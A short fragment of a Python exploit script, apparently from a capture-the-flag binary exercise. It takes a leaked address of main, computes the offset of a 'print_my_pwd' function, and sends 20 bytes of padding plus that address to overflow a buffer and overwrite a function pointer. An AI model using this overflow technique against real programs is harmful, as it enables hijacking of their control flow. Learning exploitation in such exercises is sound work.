...
main_address = int(sys.stdin.readline(), 16) # Leaked main address
print_pwd_address = main_address - 0x97
writeStr("a"*20)
writeLong(print_pwd_address)

# Overflow name and rewrite pointer to "print_my_pwd"